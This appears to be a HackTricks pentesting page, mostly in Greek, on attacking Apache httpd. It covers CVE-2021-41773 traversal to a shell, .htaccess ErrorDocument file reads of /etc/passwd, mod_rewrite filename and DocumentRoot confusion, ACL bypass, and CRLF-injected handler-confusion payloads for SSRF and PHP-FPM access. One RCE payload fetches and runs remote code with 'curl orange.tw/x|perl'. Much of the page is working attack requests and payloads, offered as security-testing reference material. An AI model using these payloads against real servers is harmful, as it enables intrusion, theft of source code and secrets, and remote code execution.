# Apache

{{#include ../../banners/hacktricks-training.md}}

## Εκτελέσιμες επεκτάσεις PHP

Ελέγξτε ποιες επεκτάσεις εκτελεί ο διακομιστής Apache. Για να τις εντοπίσετε μπορείτε να εκτελέσετε:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Επίσης, κάποια σημεία όπου μπορείτε να βρείτε αυτή τη διαμόρφωση είναι:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
## LFI μέσω .htaccess ErrorDocument file provider (ap_expr)

Αν μπορείτε να ελέγξετε το .htaccess ενός καταλόγου και το AllowOverride περιλαμβάνει FileInfo για αυτό το μονοπάτι, μπορείτε να μετατρέψετε τις απαντήσεις 404 σε αυθαίρετη ανάγνωση τοπικών αρχείων χρησιμοποιώντας τη συνάρτηση ap_expr file() μέσα σε ErrorDocument.

- Απαιτήσεις:
- Apache 2.4 με expression parser (ap_expr) ενεργοποιημένο (προεπιλογή στο 2.4).
- Το vhost/dir πρέπει να επιτρέπει στο .htaccess να ορίζει ErrorDocument (AllowOverride FileInfo).
- Ο χρήστης worker του Apache πρέπει να έχει δικαιώματα ανάγνωσης στο στοχευόμενο αρχείο.

.htaccess payload:
```apache
# Optional marker header just to identify your tenant/request path
Header always set X-Debug-Tenant "demo"
# On any 404 under this directory, return the contents of an absolute filesystem path
ErrorDocument 404 %{file:/etc/passwd}
```
Ενεργοποιείται ζητώντας οποιαδήποτε μη υπάρχουσα διαδρομή κάτω από αυτόν τον κατάλογο, για παράδειγμα όταν γίνεται κατάχρηση του userdir-style hosting:
```bash
curl -s http://target/~user/does-not-exist | sed -n '1,20p'
```
Σημειώσεις και συμβουλές:
- Only absolute paths work. The content is returned as the response body for the 404 handler.
- Τα πραγματικά δικαιώματα ανάγνωσης είναι αυτά του χρήστη Apache (συνήθως www-data/apache). Δεν θα διαβάσετε /root/* ή /etc/shadow σε προεπιλεγμένες ρυθμίσεις.
- Ακόμα και αν .htaccess είναι root-owned, αν ο γονικός κατάλογος είναι tenant-owned και επιτρέπει rename, μπορεί να είστε σε θέση να μετονομάσετε το αρχικό .htaccess και να ανεβάσετε τη δική σας αντικατάσταση μέσω SFTP/FTP:
- rename .htaccess .htaccess.bk
- put your malicious .htaccess
- Χρησιμοποιήστε αυτό για να διαβάσετε application source κάτω από DocumentRoot ή vhost config paths για να συλλέξετε μυστικά (DB creds, API keys, etc.).

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

These types of attacks has been introduced and documented [**by Orange in this blog post**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) and the following is a summary. Η "confusion" attack ουσιαστικά εκμεταλλεύεται το πώς οι δεκάδες modules που συνεργάζονται για να δημιουργήσουν ένα Apache δεν λειτουργούν τέλεια συγχρονισμένα — και το ότι μερικά από αυτά τροποποιούν απροσδόκητα δεδομένα μπορεί να προκαλέσει ευπάθεια σε κάποιο επόμενο module.

### Filename Confusion

#### Truncation

The **`mod_rewrite`** will trim the content of `r->filename` after the character `?` ([_**modules/mappers/mod_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)). Αυτό δεν είναι εντελώς λάθος καθώς τα περισσότερα modules θα αντιμετωπίσουν το `r->filename` ως URL. Αλλά σε άλλες περιπτώσεις αυτό θα αντιμετωπιστεί ως file path, κάτι που μπορεί να προκαλέσει πρόβλημα.

- **Path Truncation**

It's possible to abuse `mod_rewrite` like in the following rule example to access other files inside the file system, removing the last part of the expected path adding simply a `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
# the output of file `/var/user/orange/secret.yml`
```
- **Mislead RewriteFlag Assignment**

Στον παρακάτω κανόνα rewrite, όσο το URL τελειώνει σε .php θα αντιμετωπίζεται και θα εκτελείται ως php. Επομένως, είναι δυνατόν να σταλεί ένα URL που τελειώνει σε .php μετά το χαρακτήρα `?` ενώ στο μονοπάτι φορτώνεται τύπος αρχείου διαφορετικός (όπως μια εικόνα) με κακόβουλο κώδικα php μέσα του:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

Είναι πιθανό να αποκτηθεί πρόσβαση σε αρχεία που ο χρήστης δεν θα έπρεπε να μπορεί να προσπελάσει, ακόμη και όταν η πρόσβαση θα έπρεπε να απορριφθεί από ρυθμίσεις όπως:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Αυτό συμβαίνει επειδή από προεπιλογή το PHP-FPM θα λαμβάνει URLs που τελειώνουν σε `.php`, όπως `http://server/admin.php%3Fooo.php`, και επειδή το PHP-FPM θα αφαιρέσει οτιδήποτε μετά τον χαρακτήρα `?`, το προηγούμενο URL θα επιτρέψει τη φόρτωση του `/admin.php` ακόμα κι αν ο προηγούμενος κανόνας το απαγόρευε.

### Σύγχυση DocumentRoot
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Ένα ενδιαφέρον γεγονός για την Apache είναι ότι το προηγούμενο rewrite θα προσπαθήσει να προσπελάσει το αρχείο τόσο από το documentRoot όσο και από το root. Έτσι, ένα αίτημα προς `https://server/abouth.html` θα ελέγξει για το αρχείο στο `/var/www/html/about.html` και στο `/about.html` στο σύστημα αρχείων. Αυτό, βασικά, μπορεί να καταχραστεί για να αποκτήσει πρόσβαση σε αρχεία του συστήματος αρχείων.

#### **Αποκάλυψη πηγαίου κώδικα server-side**

- **Αποκάλυψη πηγαίου κώδικα CGI**

Αρκεί να προσθέσετε %3F στο τέλος για να leak τον πηγαίο κώδικα ενός cgi module:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
- **Αποκάλυψη PHP Source Code**

Εάν ένας διακομιστής έχει διαφορετικά domains, με ένα από αυτά να είναι στατικό domain, αυτό μπορεί να εκμεταλλευτεί για να διασχίσει το σύστημα αρχείων και να leak php code:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Local Gadgets Manipulation**

Το κύριο πρόβλημα με την προηγούμενη επίθεση είναι ότι, από προεπιλογή, η περισσότερη πρόσβαση στο filesystem θα απορριφθεί όπως στο Apache HTTP Server’s [configuration template](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115):
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Ωστόσο, τα [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) λειτουργικά συστήματα από προεπιλογή επιτρέπουν το `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Επομένως, θα ήταν δυνατό να **κακοποιηθούν αρχεία που βρίσκονται μέσα στο `/usr/share` σε αυτές τις διανομές.**

**Τοπικό Gadget για Information Disclosure**

- **Apache HTTP Server** με **websocketd** μπορεί να εκθέσει το script **dump-env.php** στο **/usr/share/doc/websocketd/examples/php/**, το οποίο μπορεί να leak ευαίσθητες μεταβλητές περιβάλλοντος.
- Οι servers με **Nginx** ή **Jetty** μπορεί να εκθέτουν ευαίσθητες πληροφορίες web εφαρμογών (π.χ. **web.xml**) μέσω των προεπιλεγμένων web roots που βρίσκονται κάτω από **/usr/share**:
- **/usr/share/nginx/html/**
- **/usr/share/jetty9/etc/**
- **/usr/share/jetty9/webapps/**

**Τοπικό Gadget για XSS**

- Σε Ubuntu Desktop με **LibreOffice** εγκατεστημένο, η εκμετάλλευση της δυνατότητας αλλαγής γλώσσας στα help files μπορεί να οδηγήσει σε **Cross-Site Scripting (XSS)**. Η χειραγώγηση του URL στο **/usr/share/libreoffice/help/help.html** μπορεί να ανακατευθύνει σε κακόβουλες σελίδες ή παλαιότερες εκδόσεις μέσω **unsafe RewriteRule**.

**Τοπικό Gadget για LFI**

- Εάν το PHP ή ορισμένα front-end πακέτα όπως **JpGraph** ή **jQuery-jFeed** είναι εγκατεστημένα, τα αρχεία τους μπορούν να εκμεταλλευτούν για να διαβαστούν ευαίσθητα αρχεία όπως **/etc/passwd**:
- **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
- **/usr/share/javascript/jquery-jfeed/proxy.php**
- **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Τοπικό Gadget για SSRF**

- Η χρήση του **MagpieRSS's magpie_debug.php** στο **/usr/share/php/magpierss/scripts/magpie_debug.php** μπορεί εύκολα να δημιουργήσει μια ευπάθεια SSRF, προσφέροντας πύλη για περαιτέρω exploits.

**Τοπικό Gadget για RCE**

- Οι ευκαιρίες για **Remote Code Execution (RCE)** είναι πολλές, με ευπαθείς εγκαταστάσεις όπως παρωχημένο **PHPUnit** ή **phpLiteAdmin**. Αυτές μπορούν να εκμεταλλευτούν για να εκτελέσουν αυθαίρετο κώδικα, δείχνοντας το εκτεταμένο δυναμικό της χειραγώγησης τοπικών gadgets.

#### **Jailbreak από Τοπικά Gadgets**

Επίσης είναι δυνατό να γίνει jailbreak από τους επιτρεπόμενους φακέλους ακολουθώντας symlinks που δημιουργούνται από εγκατεστημένο λογισμικό σε αυτούς τους φακέλους, όπως:

- **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Επιπλέον, με την κακόβουλη χρήση symlinks ήταν δυνατό να αποκτηθεί **RCE σε Redmine.**

### Σύγχυση Handler <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Αυτή η επίθεση εκμεταλλεύεται την επικάλυψη στη λειτουργικότητα μεταξύ των `AddHandler` και `AddType` directives, τα οποία και τα δύο μπορούν να χρησιμοποιηθούν για να **επιτρέψουν την επεξεργασία PHP**. Αρχικά, αυτές οι οδηγίες επηρέαζαν διαφορετικά πεδία (`r->handler` και `r->content_type` αντίστοιχα) στη εσωτερική δομή του server. Ωστόσο, λόγω legacy κώδικα, ο Apache χειρίζεται αυτές τις οδηγίες εναλλάξ υπό ορισμένες συνθήκες, μετατρέποντας το `r->content_type` σε `r->handler` αν το πρώτο είναι ορισμένο και το δεύτερο όχι.

Επιπλέον, στον Apache HTTP Server (`server/config.c#L420`), αν το `r->handler` είναι κενό πριν την εκτέλεση του `ap_run_handler()`, ο server **χρησιμοποιεί το `r->content_type` ως handler**, κάνοντας ουσιαστικά το `AddType` και `AddHandler` ίσο στο αποτέλεσμα.

#### **Επικάλυψη του Handler για Αποκάλυψη του Πηγαίου Κώδικα PHP**

Σε [**this talk**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf), παρουσιάστηκε μια ευπάθεια όπου ένα λανθασμένο `Content-Length` που αποστέλλεται από έναν client μπορεί να προκαλέσει τον Apache να καταλάθος **επιστρέψει τον πηγαίο κώδικα PHP**. Αυτό συνέβη λόγω προβλήματος χειρισμού σφαλμάτων με το ModSecurity και το Apache Portable Runtime (APR), όπου μια διπλή απάντηση οδηγεί στην επικάλυψη του `r->content_type` με `text/html`.\
Επειδή το ModSecurity δεν χειρίζεται σωστά τις τιμές επιστροφής, θα επέστρεφε τον PHP κώδικα και δεν θα τον ερμήνευε.

#### **Επικάλυψη Handler σε XXXX**

TODO: Η Orange δεν έχει αποκαλύψει ακόμη αυτή την ευπάθεια

### **Κλήση Αυθαίρετων Handlers**

Εάν ένας επιτιθέμενος μπορεί να ελέγξει την **`Content-Type`** κεφαλίδα στην απάντηση του server, θα είναι σε θέση να **invoke arbitrary module handlers**. Ωστόσο, όταν ο επιτιθέμενος αποκτήσει αυτόν τον έλεγχο, το μεγαλύτερο μέρος της διαδικασίας του request θα έχει ήδη εκτελεστεί. Παρ' όλα αυτά, είναι δυνατό να **επανακινήσει τη διαδικασία του request με την κατάχρηση της `Location` κεφαλίδας** επειδή αν το επιστρεφόμενο `Status` είναι 200 και η κεφαλίδα `Location` ξεκινά με `/`, η απάντηση αντιμετωπίζεται ως Server-Side Redirection και πρέπει να επεξεργαστεί

According to [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (specification about CGI) in [Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) defines a Local Redirect Response behavior:

> The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.

Επομένως, για να πραγματοποιηθεί αυτή η επίθεση χρειάζεται μία από τις ακόλουθες ευπάθειες:

- CRLF Injection in the CGI response headers
- SSRF with complete control of the response headers

#### **Αυθαίρετος Handler για Information Disclosure**

Για παράδειγμα το `/server-status` θα πρέπει να είναι προσβάσιμο μόνο τοπικά:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Είναι δυνατό να αποκτηθεί πρόσβαση σε αυτό ρυθμίζοντας το `Content-Type` σε `server-status` και την κεφαλίδα Location να ξεκινά με `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Αυθαίρετος handler σε πλήρες SSRF**

Ανακατεύθυνση σε `mod_proxy` για πρόσβαση σε οποιοδήποτε πρωτόκολλο σε οποιοδήποτε URL:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Ωστόσο, το header `X-Forwarded-For` προστίθεται, αποτρέποντας την πρόσβαση σε endpoints μεταδεδομένων cloud.

#### **Αυθαίρετος Handler για Πρόσβαση στο Τοπικό Unix Domain Socket**

Πρόσβαση στο τοπικό Unix Domain Socket του PHP-FPM για εκτέλεση ενός PHP backdoor που βρίσκεται στο `/tmp/:`
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Arbitrary Handler to RCE**

Η επίσημη εικόνα [PHP Docker](https://hub.docker.com/_/php) περιλαμβάνει το PEAR (`Pearcmd.php`), ένα εργαλείο διαχείρισης πακέτων PHP για τη γραμμή εντολών, το οποίο μπορεί να καταχραστεί για την απόκτηση RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Δείτε [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), γραμμένο από [Phith0n](https://x.com/phithon_xg) για τις λεπτομέρειες αυτής της τεχνικής.

## Αναφορές

- [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)
- [Apache 2.4 Custom Error Responses (ErrorDocument)](https://httpd.apache.org/docs/2.4/custom-error.html)
- [Apache 2.4 Expressions and functions (file:)](https://httpd.apache.org/docs/2.4/expr.html)
- [HTB Zero write-up: .htaccess ErrorDocument LFI and cron pgrep abuse](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)

{{#include ../../banners/hacktricks-training.md}}
